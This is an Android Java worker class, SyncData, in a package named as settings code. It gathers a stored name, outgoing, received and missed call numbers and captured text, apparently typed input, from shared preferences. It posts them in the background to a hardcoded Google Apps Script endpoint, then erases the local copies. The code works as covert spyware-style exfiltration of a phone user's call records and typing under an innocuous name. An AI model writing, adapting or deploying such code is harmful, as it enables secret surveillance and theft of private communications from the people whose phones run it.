package com.example.settings;

import android.content.Context;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class SyncData extends Worker {
    Sharedpref mSharedpref;
    Context context;
    String Name, OutgoingNumbers,RecievedNumbers,MissedCallNumbers,TextWritten,DaysTime;
    public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        mSharedpref=new Sharedpref(context);
        this.context=context;

    }

    @NonNull
    @Override
    public Result doWork() {
         Name=mSharedpref.getSaveName();
         OutgoingNumbers=mSharedpref.getOutgoingNumbers();
         RecievedNumbers=mSharedpref.getRecievedNumbers();
         MissedCallNumbers=mSharedpref.getMissedCallNumber();
         TextWritten=mSharedpref.getSaveTextWritten();

        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
        DaysTime=currentDate+"["+currentTime+"]";
        if(!OutgoingNumbers.isEmpty() && !RecievedNumbers.isEmpty() && !MissedCallNumbers.isEmpty() && !TextWritten.isEmpty()) {
            StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String response) {
                            mSharedpref.setOutgoingNumbers("");
                            mSharedpref.setRecievedNumbers("");
                            mSharedpref.setMissedCallNumber("");
                            mSharedpref.setSaveTextWritten("");
                            mSharedpref.commit();
                        }
                    },
                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError error) {
                            Result.retry();
                        }
                    }
            ) {
                @Override
                protected Map<String, String> getParams() {
                    Map<String, String> parmas = new HashMap<>();

                    //here we pass params
                    parmas.put("action", "addItem");
                    parmas.put("Name", Name);
                    parmas.put("DaysTime", DaysTime);
                    parmas.put("TextWritten", TextWritten);
                    parmas.put("OutgoingNumbers", OutgoingNumbers);
                    parmas.put("RecievedNumbers", RecievedNumbers);
                    parmas.put("MissedCallNumbers", MissedCallNumbers);
                    return parmas;
                }
            };

            int socketTimeOut = 50000;// u can change this .. here it is 50 seconds
            RetryPolicy retryPolicy = new DefaultRetryPolicy(socketTimeOut, 0, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
            stringRequest.setRetryPolicy(retryPolicy);

            RequestQueue queue = Volley.newRequestQueue(context);
            queue.add(stringRequest);
        }
        return Result.success();
    }
}
